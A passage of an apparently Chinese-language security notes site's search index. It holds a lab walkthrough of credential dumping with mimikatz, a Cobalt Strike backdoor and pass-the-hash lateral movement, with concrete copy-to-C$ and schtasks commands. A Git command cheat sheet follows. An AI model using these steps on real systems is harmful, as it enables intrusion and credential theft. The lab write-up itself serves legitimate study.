\u76f4\u63a5\u8bfblsass.exe\u5728\u5185\u5b58\u4e2d\u660e\u6587\u5bc6\u7801\uff08mimikatz\uff09","title":"\u5982\u4f55\u8ba4\u8bc1"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#lmntlm","text":"\u5728Windows\u4e2dHash\u7684\u7ed3\u6784\u901a\u5e38\u5982\u4e0b\uff1a username:RID:LM-HASH:NT-HASH","title":"LM\u548cNTLM\u54c8\u5e0c\u4ecb\u7ecd"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#lm","text":"\u660e\u6587\u5bc6\u7801\uff1a Admin@123 1\u3001\u5c06\u660e\u6587\u53e3\u4ee4\u8f6c\u4e3a\u5927\u5199 ADMIN@123 2\u3001\u5c06\u5b57\u7b26\u4e32\u5927\u5199\u540e\u8f6c\u4e3a16\u8fdb\u5236\uff08CTF-Tools Str->Hex\uff09 41444d494e40313233 3\u3001\u5bc6\u7801\u4e0d\u8db314\u5b57\u8282\u75280\u4e0d\u5168 41 44 4d 49 4e 40 31 32 33 9\u4e2a\u5b57\u8282 41 44 4d 49 4e 40 31 32 33 00 00 00 00 00 14\u4e2a\u5b57\u8282 4\u3001\u5c06\u4e0a\u8ff0\u7f16\u7801\u5206\u62102\u7ec4 \u7b2c\u4e00\u7ec4\uff1a41 44 4d 49 4e 40 31 \u7b2c\u4e8c\u7ec4\uff1a32 33 00 00 00 00 00 5\u3001\u5c06\u6bcf\u4e00\u7ec47\u5b57\u8282\u7684\u5341\u516d\u8fdb\u5236\u8f6c\u6362\u4e3a\u4e8c\u8fdb\u5236\uff0c\u6bcf7bit\u4e00\u7ec4\u672b\u5c3e\u52a00\uff0c\u518d\u8f6c\u6362\u6210\u5341\u516d\u8fdb\u5236\u5f97\u52302\u7ec48\u5b57\u8282\u7684\u7f16\u7801\uff08\u4ee5\u7b2c\u4e00\u7ec4\u4e3a\u4f8b\uff09 \u7b2c\u4e00\u7ec4\uff1a 41444d494e4031 \u5148\u8f6c\u4e3a\u4e8c\u8fdb\u5236\uff08\u8ba1\u7b97\u5668\uff09 01000001010001000100110101001001010011100100000000110001 \u6bcf7\u4e2abit\u4e00\u7ec4 0100000 1010001 0001001 1010100 1001010 0111001 0000000 0110001 \u540e\u9762\u52a00 01000000 10100010 00010010 10101000 10010100 01110010 00000000 01100010 \u518d\u8f6c\u53d8\u4e3a16\u8fdb\u5236\uff08\u8ba1\u7b97\u5668\uff09 \u7b2c\u4e00\u7ec4\uff1a 0100000010100010000100101010100010010100011100100000000001100010 \u8f6c\u4e3a16\u8fdb\u5236 40A212A894720062 \u540c\u7406\u7b2c\u4e8c\u7ec4\u5f97\u5230\uff1a3218C00000000000 6\u3001\u5c06\u4ee5\u4e0a\u6b65\u9aa4\u5f97\u5230\u7684\u4e24\u7ec48\u5b57\u8282\u7f16\u7801\uff0c\u5206\u522b\u4f5c\u4e3aDES\u52a0\u5bc6\u7684key\u6765\u52a0\u5bc6\u9b54\u672f\u5b57\u7b26\u4e32 KGS!@#$% \u9700\u8981\u5168\u90e8\u8f6c\u6362\u4e3a\u5341\u516d\u8fdb\u5236\u8fd0\u7b97 \u5f97\u5230\u52a0\u5bc6\u7ed3\u679c\uff1a \u7b2c\u4e00\u7ec4\uff1a6F08D7B306B1DAD4 \u7b2c\u4e8c\u7ec4\uff1aB75E0C8D76954A50 7\u3001\u5408\u5e76\u4e24\u7ec4\u6570\u636e\uff0c\u6700\u7ec8\u7ed3\u679c\u5c31\u662fLM Hash 6F08D7B306B1DAD4B75E0C8D76954A50","title":"LM\u54c8\u5e0c"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#ntlm","text":"\u660e\u6587\u5bc6\u7801\uff1a Admin@123 1\u3001\u5c06\u660e\u6587\u53e3\u4ee4\u8f6c\u6362\u4e3a16\u8fdb\u5236 41646d696e40313233 2\u3001\u8f6c\u6362\u4e3aunicode\u683c\u5f0f\uff08\u6bcf\u5b57\u8282\u540e\u8865\u4fe90\uff09 410064006d0069006e004000310032003300 3\u3001\u5bf9Unicode\u5b57\u7b26\u4e32\u505aMD4\u52a0\u5bc6\uff08\u5c0f\u751f->HashCalc\uff09 570a9a65db8fba761c1008a51d4c95ab 4\u3001\u5f97\u5230\u7684\u5bc6\u6587\u5c31\u662fNTLM Hash","title":"NTLM\u54c8\u5e0c"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#mimikatz","text":"1\u3001\u76f4\u63a5\u6293\u53d6SAM\u6587\u4ef6\u5bc6\u7801 2\u3001\u53bblsass\u8fdb\u7a0b\u6293\u53d6\u660e\u6587\u5bc6\u7801\uff08winserver2012\u4ee5\u540e\u5931\u6548\uff09","title":"Mimikatz\u6293\u53d6\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#cs","text":"","title":"cs\u5b9e\u9a8c\u6a21\u62df"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#cs_1","text":"vps\u542f\u52a8cs4.1\uff0c\u8fd0\u884c cd cs4.1/ bash teamserver vpsip 12345 ( \u8fde\u63a5\u5bc6\u7801 ) \u672c\u5730window\u8fd0\u884c cobaltstrikeCN.vbs \u8f93\u5165\u4e3b\u673aIP\uff0c\u7aef\u53e39081\uff0c\u7528\u6237\u540d\u548c\u5bc6\u7801 \u8fde\u63a5\u6210\u529f\uff01","title":"\u542f\u52a8cs"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#_2","text":"\u4e0b\u4e00\u6b65\u751f\u6210exe\u540e\u95e8\u6728\u9a6c\uff1a\u70b9\u51fb\u653b\u51fb->\u751f\u6210\u540e\u95e8->Windows Executable\uff0c\u76d1\u542c\u5668\u9009\u62e9http\u5373\u53ef \u653e\u5230\u4e00\u53f0\u6a21\u62df\u5185\u7f51\u865a\u62df\u673a\u4e0a\u8fd0\u884c\uff0ccs\u6210\u529f\u4e0a\u7ebf\u4e00\u53f0\u5185\u7f51\u9776\u673a192.168.41.20","title":"\u62ff\u4e0b\u4e00\u53f0\u5185\u7f51\u9776\u673a"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#_3","text":"\u786e\u8ba4\u5185\u7f51\u5176\u4ed6\u5b58\u6d3b\u4e3b\u673a cs\u4e3b\u673a\u53f3\u952e->\u76ee\u6807->\u7aef\u53e3\u626b\u63cf \u770b\u5230\u53e6\u4e00\u53f0\u4e3b\u673a192.168.41.130\u5b58\u6d3b","title":"\u626b\u63cf\u5185\u7f51"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#_4","text":"cs\u4e3b\u673a\u53f3\u952e->\u6267\u884c->Run Mimikatz \u56de\u663e\u4e86\u65e2\u6709NTLM Hash\u53c8\u6709\u660e\u6587\u5bc6\u7801 \u4e0b\u4e00\u6b65\u62ff\u7740\u8fd9\u4e2aHash\u5c1d\u8bd5\u767b\u5f55130\u8fd9\u53f0\u673a\u5668\uff0c\u5373PTH\uff08Pass The Hash\uff09","title":"\u6293\u53d6\u672c\u5730\u7684\u5bc6\u7801"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#pth_1","text":"cs\u547d\u4ee4\u884c\u8f93\u5165 pth Administrator 570a9a65db8fba761c1008a51d4c95ab","title":"\u8fdb\u884cPTH\u653b\u51fb"},{"location":"%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8/PTH%E4%BC%A0%E9%80%92%E8%87%B3cs%E4%B8%8A%E7%BA%BF/#cs_2","text":"1\u3001\u590d\u5236\u6728\u9a6c\u81f3\u76ee\u6807\u673a\u5668 cs\u547d\u4ee4\u884c\u8f93\u5165 shell copy c: \\u sers \\a dministrator \\d esktop \\a rtifact.exe \\\\ 192 .168.41.130 \\c $ 2\u3001\u76ee\u6807\u4e3b\u673a\u521b\u5efa\u8ba1\u5212\u4efb\u52a1 cs\u547d\u4ee4\u884c\u8f93\u5165 shell schtasks /create /s 192 .168.41.130 /tn test /sc onstart /tr c: \\a rtifact.exe /ru system /f 3\u3001\u624b\u52a8\u6267\u884c\u8ba1\u5212\u4efb\u52a1 cs\u547d\u4ee4\u884c\u8f93\u5165 shell schtasks /run /s 192 .168.41.130 /i /tn \"test\" 130\u4e3b\u673a\u6210\u529f\u4e0a\u7ebf","title":"\u76ee\u6807\u673a\u5668cs\u4e0a\u7ebf"},{"location":"%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE/Git%E5%85%A5%E9%97%A8/","text":"Git\u5165\u95e8 \u00b6 \u7248\u672c\u63a7\u5236 \u00b6 \u672c\u5730\u7248\u672c\u63a7\u5236 \u00b6 \u6bcf\u4e2a\u6587\u4ef6\u4e00\u4e2a\u5feb\u7167\uff0c\u4e2a\u4eba\u7528\uff0c\u5982RCS \u96c6\u4e2d\u7248\u672c\u63a7\u5236 \u00b6 \u6240\u6709\u7248\u672c\u4fdd\u5b58\u5728\u670d\u52a1\u5668\u4e0a\uff0c\u534f\u540c\u5f00\u53d1\u8005\u4ece\u670d\u52a1\u5668\u4e0a\u540c\u6b65\u66f4\u65b0\u6216\u8005\u4fee\u6539\u4e0a\u4f20 \u5982\u679c\u7528\u6237\u4e0d\u8054\u7f51\uff0c\u5c31\u770b\u4e0d\u5230\u5386\u53f2\u7248\u672c\uff1b\u5982\u679c\u670d\u52a1\u5668\u635f\u574f\uff0c\u5c31\u4f1a\u4e22\u5931\u6240\u6709\u6570\u636e \u4ee3\u8868\u4ea7\u54c1\uff1aSVN\u3001CVS\u3001VSS \u5206\u5e03\u5f0f\u7248\u672c\u63a7\u5236 \u00b6 \u6240\u6709\u7248\u672c\u4fe1\u606f\u5168\u90e8\u540c\u6b65\u5230\u6bcf\u4e2a\u7528\u6237\u672c\u5730\uff0c\u6240\u6709\u53ef\u4ee5\u79bb\u7ebf\u67e5\u770b\u5386\u53f2\u6570\u636e\uff1b\u53ea\u8981\u6709\u4e00\u4e2a\u7528\u6237\u8bbe\u5907\u6ca1\u95ee\u9898\uff0c\u5c31\u53ef\u4ee5\u6062\u590d\u6240\u6709\u6570\u636e \u4ee3\u8868\u4ea7\u54c1\uff1aGit \u73af\u5883\u914d\u7f6e \u00b6 \u53bb \u5b98\u7f51 \uff0c\u6216\u8005\u955c\u50cf\u7ad9\u4e0b\u8f7d \u4e3a\u65b9\u4fbf\u4f7f\u7528\uff0c\u53ef\u589e\u52a0\u73af\u5883\u53d8\u91cf \u5b89\u88c5\u8def\u5f84\\Git\\cmd \u57fa\u672c\u547d\u4ee4 \u00b6 Git\u914d\u7f6e \u00b6 \u67e5\u770b\u914d\u7f6e git config -l \u53ea\u770b\u7cfb\u7edf\u81ea\u5e26\u914d\u7f6e git config --system --list \u53ea\u770b\u7528\u6237\u81ea\u5df1\u914d\u7684\u914d\u7f6e git config --global --list \u914d\u7f6e\u6587\u4ef6\u8def\u5f84\uff1a Git\\etc\\gitconfig\uff1aGit\u5b89\u88c5\u76ee\u5f55\u4e0bgitconfig --system C:\\Users\\xxxx.gitconfig\uff1a\u5f53\u524d\u767b\u5f55\u7528\u6237\u914d\u7f6e --global \u8bbe\u7f6e\u7528\u6237\u540d\u4e0e\u90ae\u7bb1\uff08\u5fc5\u987b\uff09\uff1a git config --global user.name \"F1rstb100d\" git config --global user.email \"123456@qq.com\" Git\u57fa\u672c\u7406\u8bba \u00b6 Git\u672c\u5730\u6709\u4e09\u4e2a\u5de5\u4f5c\u533a\uff1a\u5de5\u4f5c\u76ee\u5f55\uff08Working Directory\uff09\u3001\u6682\u5b58\u533a\uff08Stage/Index\uff09\u3001\u8d44\u6e90\u5e93\uff08Repository\uff09 \u4ee5\u53ca\u7b2c\u56db\u4e2a\u5de5\u4f5c\u533a\uff1a\u8fdc\u7a0b\u7684git\u4ed3\u5e93\uff08Remote Directory\uff09 Workspace\uff1a\u5de5\u4f5c\u533a\uff0c\u5b58\u653e\u4ee3\u7801 Index / Stage\uff1a\u6682\u5b58\u533a\uff0c\u4e34\u65f6\u5b58\u653e\u6539\u52a8\uff0c\u672c\u8d28\u662f\u4e00\u4e2a\u6587\u4ef6 Repository\uff1a\u672c\u5730\u4ed3\u5e93\uff0c\u6240\u6709\u63d0\u4ea4\u7684\u6570\u636e\uff0cHEAD\u6307\u5411\u6700\u65b0\u653e\u5165\u4ed3\u5e93\u7684\u7248\u672c Remote\uff1a\u8fdc\u7a0b\u4ed3\u5e93\uff0c\u6258\u7ba1\u4ee3\u7801\u7684\u670d\u52a1\u5668 Git\u5de5\u4f5c\u6d41\u7a0b \u00b6 \u5728\u5de5\u4f5c\u76ee\u5f55\u6dfb\u52a0\u3001\u4fee\u6539\u6587\u4ef6 \u5c06\u9700\u8981\u8fdb\u884c\u7248\u672c\u7ba1\u7406\u7684\u6587\u4ef6\u653e\u5165\u6682\u5b58\u533a \u5c06\u6682\u5b58\u533a\u7684\u6587\u4ef6\u63d0\u4ea4\u5230git\u4ed3\u5e93 git\u7ba1\u7406\u7684\u6587\u4ef6\u6709\u4e09\u79cd\u72b6\u6001\uff1a\u5df2\u4fee\u6539\uff08modified\uff09\u3001\u5df2\u6682\u5b58\uff08staged\uff09\u3001\u5df2\u63d0\u4ea4\uff08committed\uff09 Git\u9879\u76ee\u642d\u5efa \u00b6 \u65e5\u5e38\u4f7f\u7528\u547d\u4ee4\uff1a \u672c\u5730\u4ed3\u5e93\u642d\u5efa \u00b6 \u9996\u5148\u521d\u59cb\u5316\u4ed3\u5e93\uff1a git init \u5728\u5f53\u524d\u76ee\u5f55\u591a\u4e00\u4e2a.git\u6587\u4ef6\u5939\uff0c\u7248\u672c\u63a7\u5236\u4fe1\u606f\u90fd\u5728\u91cc\u9762 \u514b\u9686\u8fdc\u7a0b\u4ed3\u5e93 \u00b6 \u76f4\u63a5\u514b\u9686\u73b0\u6709\u7684\u4ed3\u5e93\u5230\u672c\u5730\uff1a git clone [url] Git\u6587\u4ef6\u64cd\u4f5c \u00b6 \u6587\u4ef6\u76844\u79cd\u72b6\u6001 \u00b6 Untracked\uff1a\u672a\u8ddf\u8e2a\uff0c\u867d\u5728\u6587\u4ef6\u5939\u4e2d\uff0c\u4f46\u672a\u6dfb\u52a0\u5230git\u7248\u672c\u63a7\u5236\uff0c\u901a\u8fc7 git add \u72b6\u6001\u53d8\u4e3a Staged Unmodify\uff1a\u6587\u4ef6\u5df2\u5165\u5e93\u672a\u4fee\u6539\uff0c\u82e5\u4fee\u6539\u5219\u53d8\u4e3a Modified \uff0c\u82e5\u4f7f\u7528 git rm \u79fb\u51fa\u7248\u672c\u5e93\uff0c\u5219\u53d8\u4e3a Untracked Modified\uff1a\u6587\u4ef6\u5df2\u4fee\u6539\uff0c\u901a\u8fc7 git add \u8fdb\u5165\u6682\u5b58\u72b6\u6001 Staged \uff0c\u4f7f\u7528 git checkout \u4e22\u5f03\u4fee\u6539\uff0c\u56de\u5230 Unmodify \u72b6\u6001 Staged\uff1a\u6682\u5b58\u72b6\u6001\uff0c\u6267\u884c git commit \u5c06\u4fee\u6539\u540c\u6b65\u5230\u5e93\u4e2d\uff0c\u6587\u4ef6\u53d8\u4e3a Unmodify \u72b6\u6001\uff0c\u6267\u884c git reset HEAD filename \u53d6\u6d88\u6682\u5b58\uff0c\u6587\u4ef6\u53d8\u4e3a Modified \u67e5\u770b\u6587\u4ef6\u72b6\u6001 \u00b6 git status [ filename ] #\u67e5\u770b\u6307\u5b9a\u6587\u4ef6\u72b6\u6001 git status #\u67e5\u770b\u6240\u6709\u6587\u4ef6\u72b6\u6001 \u5ffd\u7565\u6587\u4ef6 \u00b6 \u5982\u679c\u6709\u4e9b\u6587\u4ef6\u6211\u4eec\u4e0d\u60f3\u8ba9\u4ed6\u52a0\u5165\u7248\u672c\u63a7\u5236\u3002 \u5728\u4e3b\u76ee\u5f55\u4e0b\u5efa\u7acb .gitignore \u6587\u4ef6\uff0c\u6709\u5982\u4e0b\u89c4\u5219\uff1a \u5ffd\u7565\u6587\u4ef6\u7a7a\u884c\u4ee5\u53ca # \u5f00\u5934\u7684\u884c \u53ef\u4ee5\u4f7f\u7528Linux\u901a\u914d\u7b26\uff08 * \u4ee3\u8868\u591a\u4e2a\u5b57\u7b26\uff0c ? \u4ee3\u8868\u4e00\u4e2a\u5b57\u7b26\uff0c [abc] \u4ee3\u8868\u53ef\u9009\u5b57\u7b26\uff09 \u6700\u524d\u9762\u6709\u4e00\u4e2a ! \uff0c\u8868\u793a\u4f8b\u5916\u89c4\u5219\uff0c\u5c06\u4e0d\u88ab\u5ffd\u7565 \u6700\u524d\u662f\u5206\u9694\u7b26 / \uff0c\u8868\u793a\u5ffd\u7565\u6839\u76ee\u5f55\u4e0b\u7684\u6587\u4ef6\u5939\uff0c\u5176\u4ed6\u8def\u5f84\u4e0b\u8be5\u6587\u4ef6\u540d\u4e0d\u5ffd\u7565 \u6700\u540e\u662f\u5206\u9694\u7b26 / \uff0c\u8868\u793a\u65e0\u8bba\u662f\u5426\u5728\u6839\u76ee\u5f55\uff0c\u5747\u5ffd\u7565\u8be5\u6587\u4ef6\u5939 #\u4e3a\u6ce8\u91ca *.txt #\u5ffd\u7565\u6240\u6709\u4ee5.txt\u7ed3\u5c3e\u7684\u6587\u4ef6 !lib.txt #lib.txt\u4e0d\u88ab\u5ffd\u7565 /temp #\u4ec5\u5ffd\u7565\u6839\u76ee\u5f55\u4e0btemp\u6587\u4ef6\u5939\uff0c\u4e0d\u5305\u62ec\u5176\u4ed6\u76ee\u5f55\u4e0b\u7684temp\u6587\u4ef6\u5939 build/ #\u5ffd\u7565\u6240\u6709build\u76ee\u5f55\u4e0b\u6587\u4ef6 doc/*.txt #\u4ec5\u5ffd\u7565\u6240\u6709doc\u6587\u4ef6\u5939\u4e2d\u4ee5.txt\u7ed3\u5c3e\u7684\u6587\u4ef6 \u7ed1\u5b9a\u8fdc\u7a0bGit \u00b6 \u9996\u5148\u9700\u8981\u6ce8\u518cGithub\u6216\u8005Gitee \u7136\u540e\u8bbe\u7f6e\u672c\u673aSSH\u516c\u94a5\uff0c\u5b9e\u73b0\u514d\u5bc6\u7801\u767b\u5f55 ssh-keygen -t rsa #\u67e5\u770bC:\\User\\xxxx\\.ssh\u76ee\u5f55\u4e0b\u751f\u6210\u7684\u6587\u4ef6\uff08id_rsa\u3001id_rsa.pub\uff09 \u5c06\u516c\u94a5\u4fe1\u606f\uff08id_rsa.pub\uff09\u6dfb\u52a0\u5230github\u8d26\u6237\u4e2d \u7136\u540e\u5c31\u53ef\u4ee5\u628a\u8fdc\u7a0b\u4ed3\u5e93\u548c\u672c\u5730\u7ed1\u5b9a\u4e86 Git\u5206\u652f \u00b6 \u5e38\u7528\u6307\u4ee4\uff1a git branch #\u5217\u51fa\u6240\u6709\u672c\u5730\u5206\u652f git branch -r #\u5217\u51fa\u6240\u6709\u8fdc\u7a0b\u5206\u652f git branch [ branch-name ] #\u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u4f46\u4ecd\u4fdd\u7559\u5728\u5f53\u524d\u5206\u652f git checkout -b [ branch ] #\u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u5e76\u5207\u6362\u5230\u8be5\u5206\u652f git merge [ branch ] #\u5408\u5e76\u6307\u5b9a\u5206\u652f\u5230\u5f53\u524d\u5206\u652f git branch -d [ branch-name ] #\u5220\u9664\u5206\u652f #\u5220\u9664\u8fdc\u7a0b\u5206\u652f git push origin --delete [ branch-name ] git branch -dr [ remote/branch ] \u5982\u679c\u540c\u4e00\u4e2a\u6587\u4ef6\u5728\u5408\u5e76\u5206\u652f\u65f6\u90fd\u88ab\u4fee\u6539\u5219\u4f1a\u5f15\u8d77**\u51b2\u7a81** \u89e3\u51b3\u65b9\u6cd5\u662f\u4fee\u6539\u51b2\u7a81\u6587\u4ef6\uff08\u9009\u62e9\u4fdd\u7559\u54ea\u4e00\u4efd\uff09\u540e\u91cd\u65b0\u63d0\u4ea4 \u4e00\u822c\u5728dev\u5206\u652f\u5408\u5e76\u5230\u7a33\u5b9a\u540e\u518d\u5408\u5e76\u5230\u4e3b\u5206\u652fmaster\u4e0a \u5907\u5fd8\u5f55 \u00b6 \u53c2\u8003\uff1a https://gitee.com/all-about-git \u4ed3\u5e93 \u00b6 # \u5728\u5f53\u524d\u76ee\u5f55\u65b0\u5efa\u4e00\u4e2aGit\u4ee3\u7801\u5e93 $ git init # \u65b0\u5efa\u4e00\u4e2a\u76ee\u5f55\uff0c\u5c06\u5176\u521d\u59cb\u5316\u4e3aGit\u4ee3\u7801\u5e93 $ git init [ project-name ] # \u4e0b\u8f7d\u4e00\u4e2a\u9879\u76ee\u548c\u5b83\u7684\u6574\u4e2a\u4ee3\u7801\u5386\u53f2 $ git clone [ url ] \u914d\u7f6e \u00b6 # \u663e\u793a\u5f53\u524d\u7684Git\u914d\u7f6e $ git config --list # \u7f16\u8f91Git\u914d\u7f6e\u6587\u4ef6 $ git config -e [ --global ] # \u8bbe\u7f6e\u63d0\u4ea4\u4ee3\u7801\u65f6\u7684\u7528\u6237\u4fe1\u606f $ git config [ --global ] user.name \"[name]\" $ git config [ --global ] user.email \"[email address]\" \u589e\u52a0/\u5220\u9664\u6587\u4ef6 \u00b6 # \u6dfb\u52a0\u6307\u5b9a\u6587\u4ef6\u5230\u6682\u5b58\u533a $ git add [ file1 ] [ file2 ] ... # \u6dfb\u52a0\u6307\u5b9a\u76ee\u5f55\u5230\u6682\u5b58\u533a\uff0c\u5305\u62ec\u5b50\u76ee\u5f55 $ git add [ dir ] # \u6dfb\u52a0\u5f53\u524d\u76ee\u5f55\u7684\u6240\u6709\u6587\u4ef6\u5230\u6682\u5b58\u533a $ git add . # \u6dfb\u52a0\u6bcf\u4e2a\u53d8\u5316\u524d\uff0c\u90fd\u4f1a\u8981\u6c42\u786e\u8ba4 # \u5bf9\u4e8e\u540c\u4e00\u4e2a\u6587\u4ef6\u7684\u591a\u5904\u53d8\u5316\uff0c\u53ef\u4ee5\u5b9e\u73b0\u5206\u6b21\u63d0\u4ea4 $ git add -p # \u5220\u9664\u5de5\u4f5c\u533a\u6587\u4ef6\uff0c\u5e76\u4e14\u5c06\u8fd9\u6b21\u5220\u9664\u653e\u5165\u6682\u5b58\u533a $ git rm [ file1 ] [ file2 ] ... # \u505c\u6b62\u8ffd\u8e2a\u6307\u5b9a\u6587\u4ef6\uff0c\u4f46\u8be5\u6587\u4ef6\u4f1a\u4fdd\u7559\u5728\u5de5\u4f5c\u533a $ git rm --cached [ file ] # \u6539\u540d\u6587\u4ef6\uff0c\u5e76\u4e14\u5c06\u8fd9\u4e2a\u6539\u540d\u653e\u5165\u6682\u5b58\u533a $ git mv [ file-original ] [ file-renamed ] \u4ee3\u7801\u63d0\u4ea4 \u00b6 # \u63d0\u4ea4\u6682\u5b58\u533a\u5230\u4ed3\u5e93\u533a $ git commit -m [ message ] # \u63d0\u4ea4\u6682\u5b58\u533a\u7684\u6307\u5b9a\u6587\u4ef6\u5230\u4ed3\u5e93\u533a $ git commit [ file1 ] [ file2 ] ... -m [ message ] # \u63d0\u4ea4\u5de5\u4f5c\u533a\u81ea\u4e0a\u6b21commit\u4e4b\u540e\u7684\u53d8\u5316\uff0c\u76f4\u63a5\u5230\u4ed3\u5e93\u533a $ git commit -a # \u63d0\u4ea4\u65f6\u663e\u793a\u6240\u6709diff\u4fe1\u606f $ git commit -v # \u4f7f\u7528\u4e00\u6b21\u65b0\u7684commit\uff0c\u66ff\u4ee3\u4e0a\u4e00\u6b21\u63d0\u4ea4 # \u5982\u679c\u4ee3\u7801\u6ca1\u6709\u4efb\u4f55\u65b0\u53d8\u5316\uff0c\u5219\u7528\u6765\u6539\u5199\u4e0a\u4e00\u6b21commit\u7684\u63d0\u4ea4\u4fe1\u606f $ git commit --amend -m [ message ] # \u91cd\u505a\u4e0a\u4e00\u6b21commit\uff0c\u5e76\u5305\u62ec\u6307\u5b9a\u6587\u4ef6\u7684\u65b0\u53d8\u5316 $ git commit --amend [ file1 ] [ file2 ] ... \u5206\u652f \u00b6 # \u5217\u51fa\u6240\u6709\u672c\u5730\u5206\u652f $ git branch # \u5217\u51fa\u6240\u6709\u8fdc\u7a0b\u5206\u652f $ git branch -r # \u5217\u51fa\u6240\u6709\u672c\u5730\u5206\u652f\u548c\u8fdc\u7a0b\u5206\u652f $ git branch -a # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u4f46\u4f9d\u7136\u505c\u7559\u5728\u5f53\u524d\u5206\u652f $ git branch [ branch-name ] # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u5e76\u5207\u6362\u5230\u8be5\u5206\u652f $ git checkout -b [ branch ] # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u6307\u5411\u6307\u5b9acommit $ git branch [ branch ] [ commit ] # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u4e0e\u6307\u5b9a\u7684\u8fdc\u7a0b\u5206\u652f\u5efa\u7acb\u8ffd\u8e2a\u5173\u7cfb $ git branch --track [ branch ] [ remote-branch ] # \u5207\u6362\u5230\u6307\u5b9a\u5206\u652f\uff0c\u5e76\u66f4\u65b0\u5de5\u4f5c\u533a $ git checkout [ branch-name ] # \u5207\u6362\u5230\u4e0a\u4e00\u4e2a\u5206\u652f $ git checkout - # \u5efa\u7acb\u8ffd\u8e2a\u5173\u7cfb\uff0c\u5728\u73b0\u6709\u5206\u652f\u4e0e\u6307\u5b9a\u7684\u8fdc\u7a0b\u5206\u652f\u4e4b\u95f4 $ git branch --set-upstream [ branch ] [ remote-branch ] # \u5408\u5e76\u6307\u5b9a\u5206\u652f\u5230\u5f53\u524d\u5206\u652f $ git merge [ branch ] # \u9009\u62e9\u4e00\u4e2acommit\uff0c\u5408\u5e76\u8fdb\u5f53\u524d\u5206\u652f $ git cherry-pick [ commit ] # \u5220\u9664\u5206\u652f $ git branch -d [ branch-name ] # \u5220\u9664\u8fdc\u7a0b\u5206\u652f $ git push origin --delete [ branch-name ] $ git branch -dr [ remote/branch ] \u6807\u7b7e \u00b6 # \u5217\u51fa\u6240\u6709tag $ git tag # \u65b0\u5efa\u4e00\u4e2atag\u5728\u5f53\u524dcommit $ git tag [ tag ] # \u65b0\u5efa\u4e00\u4e2atag\u5728\u6307\u5b9acommit $ git tag [ tag ] [ commit ] # \u5220\u9664\u672c\u5730tag $ git tag -d [ tag ] # \u5220\u9664\u8fdc\u7a0btag $ git push origin :refs/tags/ [ tagName ] # \u67e5\u770btag\u4fe1\u606f $ git show [ tag ] # \u63d0\u4ea4\u6307\u5b9atag $ git push [ remote ] [ tag ] # \u63d0\u4ea4\u6240\u6709tag $ git push [ remote ] --tags # \u65b0\u5efa\u4e00\u4e2a\u5206\u652f\uff0c\u6307\u5411\u67d0\u4e2atag $ git checkout -b [ branch ] [ tag ] \u67e5\u770b\u4fe1\u606f \u00b6 # \u663e\u793a\u6709\u53d8\u66f4\u7684\u6587\u4ef6 $ git status # \u663e\u793a\u5f53\u524d\u5206\u652f\u7684\u7248\u672c\u5386\u53f2 $ git log # \u663e\u793acommit\u5386\u53f2\uff0c\u4ee5\u53ca\u6bcf\u6b21commit\u53d1\u751f\u53d8\u66f4\u7684\u6587\u4ef6 $ git log --stat # \u641c\u7d22\u63d0\u4ea4\u5386\u53f2\uff0c\u6839\u636e\u5173\u952e\u8bcd $ git log -S [ keyword ] # \u663e\u793a\u67d0\u4e2acommit\u4e4b\u540e\u7684\u6240\u6709\u53d8\u52a8\uff0c\u6bcf\u4e2acommit\u5360\u636e\u4e00\u884c $ git log [ tag ] HEAD --pretty = format:%s # \u663e\u793a\u67d0\u4e2acommit\u4e4b\u540e\u7684\u6240\u6709\u53d8\u52a8\uff0c\u5176\"\u63d0\u4ea4\u8bf4\u660e\"\u5fc5\u987b\u7b26\u5408\u641c\u7d22\u6761\u4ef6 $ git log [ tag ] HEAD --grep feature # \u663e\u793a\u67d0\u4e2a\u6587\u4ef6\u7684\u7248\u672c\u5386\u53f2\uff0c\u5305\u62ec\u6587\u4ef6\u6539\u540d $ git log --follow [ file ] $ git whatchanged [ file ] # \u663e\u793a\u6307\u5b9a\u6587\u4ef6\u76f8\u5173\u7684\u6bcf\u4e00\u6b21diff $ git log -p [ file ] # \u663e\u793a\u8fc7\u53bb5\u6b21\u63d0\u4ea4 $ git log -5 --pretty --oneline # \u663e\u793a\u6240\u6709\u63d0\u4ea4\u8fc7\u7684\u7528\u6237\uff0c\u6309\u63d0\u4ea4\u6b21\u6570\u6392\u5e8f $ git shortlog -sn # 